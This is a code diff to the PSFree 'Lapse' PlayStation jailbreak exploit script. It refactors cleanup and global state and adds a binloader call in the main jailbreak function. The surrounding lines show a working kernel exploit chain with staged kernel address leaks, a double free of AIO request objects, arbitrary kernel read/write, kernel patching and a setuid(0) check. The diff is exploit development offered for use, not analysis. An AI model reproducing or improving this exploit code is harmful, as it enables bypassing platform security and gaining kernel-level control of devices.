@@ -1,4 +1,4 @@
-/* Copyright (C) 2025 anonymous
+﻿/* Copyright (C) 2025 anonymous
 
 This file is part of PSFree.
 
@@ -5104,6 +5104,40 @@ function checkPlatformIsSupported() {
   // FW control
   return supportedFW[device].indexOf(fwVersion) !== -1;
 }
+var block_fd, unblock_fd, current_core, current_rtprio, current_core_stored;
+var sds, block_id, groom_ids, pktopts_sds, dirty_sd, sd_pair_main;
+
+function doCleanup() {
+  if (unblock_fd !== -1) {
+    try { close(unblock_fd); } catch (e) {}
+    unblock_fd = -1;
+  }
+  if (block_fd !== -1) {
+    try { close(block_fd); } catch (e) {}
+    block_fd = -1;
+  }
+  if (groom_ids !== null) {
+    try { free_aios2(groom_ids.addr, groom_ids.length); } catch (e) {}
+    groom_ids = null;
+  }
+  if (block_id !== 0xffffffff && block_id !== null) {
+    try { aio_multi_wait(block_id.addr, 1); } catch(e) {}
+    try { aio_multi_delete(block_id.addr, block_id.length); } catch(e) {}
+    block_id = null;
+  }
+  if (sds !== null) {
+    for (const sd of sds) {
+      try { close(sd); } catch(e) {}
+    }
+    sds = null;
+  }
+  if (pktopts_sds !== null) {
+    for (const psd of pktopts_sds) {
+      try { close(psd); } catch(e) {}
+    }
+    pktopts_sds = null;
+  }
+}
 //================================================================================================
 // Main Jailbreak Function =======================================================================
 //================================================================================================
@@ -5185,15 +5219,17 @@ async function doJBwithPSFreeLapseExploit() {
     let jb_step_status;
     jb_step_status = Init_Globals();
     if (jb_step_status !== 1) {
-      window.log("Global variables not properly initialized. Please restart console and try again...", "red");
+      window.log("Global variables not properly initialized. Please refresh page and try again...", "red");
       return false;
     }
     await lapse_init();
 
     // Save the thread's CPU core and realtime priority to maintain system stability during the exploit.
     // Stability tweaks from Al-Azif's source
-    const current_core = get_current_core();
-    const current_rtprio = get_current_rtprio();
+    current_core_stored = 0;
+    current_core = get_current_core();
+    current_rtprio = get_current_rtprio();
+    current_core_stored = 1;
     //log(`current core: ${current_core}`);
     //log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
     // if the first thing you do since boot is run the web browser, WebKit can
@@ -5212,20 +5248,25 @@ async function doJBwithPSFreeLapseExploit() {
     //log("setting main thread's priority");
     set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
     //sysi('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
-    const [block_fd, unblock_fd] = (() => {
+    block_fd = -1;
+    unblock_fd = -1;
+    [block_fd, unblock_fd] = (() => {
       const unix_pair = new View4(2);
       sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
       return unix_pair;
     })();
-    const sds = [];
+    sds = [];
     for (let i = 0; i < num_sds; i++) {
       sds.push(new_socket());
     }
-    let block_id = null;
-    let groom_ids = null;
+    block_id = null;
+    groom_ids = null;
+    pktopts_sds = null;
+    sd_pair_main = null;
     try {
     if (sysi("setuid", 0) == 0) {
-       window.log("\nkernel already patched, skipping kexploit", "green");
+      window.log("\nAlready jailbroken, no need to re-jailbreak", "green");
+      runBinLoader();
       return true;
     }
   } catch (error) {
@@ -5241,21 +5282,14 @@ async function doJBwithPSFreeLapseExploit() {
     const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair);
     window.log('Lapse STAGE 3/5: Double free SceKernelAioRWRequest');
     await sleep(50); // Wait 50ms
-    const [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds);
+    [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds);
     window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
     await sleep(50); // Wait 50ms
     const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
     window.log('Lapse STAGE 5/5: Patch kernel');
     await sleep(50); // Wait 50ms
     await patch_kernel(kbase, kmem, p_ucred, restore_info);
-    close(unblock_fd);
-    close(block_fd);
-    free_aios2(groom_ids.addr, groom_ids.length);
-    aio_multi_wait(block_id.addr, 1);
-    aio_multi_delete(block_id.addr, block_id.length);
-    for (const sd of sds) {
-      close(sd);
-    }
+    doCleanup(); // Only works on success
     // Restore the thread's CPU core and realtime priority to maintain system stability during the exploit.
     // Stability tweaks from Al-Azif's source
     //log(`restoring core: ${current_core}`);
